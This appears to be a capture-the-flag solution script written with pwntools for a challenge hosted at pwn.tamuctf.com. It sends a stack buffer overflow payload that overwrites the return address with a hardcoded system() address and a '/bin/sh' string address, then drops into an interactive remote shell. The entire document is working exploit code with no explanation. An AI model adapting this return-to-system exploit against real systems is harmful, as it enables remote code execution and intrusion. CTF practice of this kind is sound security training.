from pwn import *

system_func = 0x804ee30
bin_sh = 0x80BC140

payload = "A" * 0xd + "BBBB" + p32(system_func) + "CCCC" + p32(bin_sh)

r = remote("pwn.tamuctf.com", 4325)

r.sendline(payload)

r.interactive()

r.close()
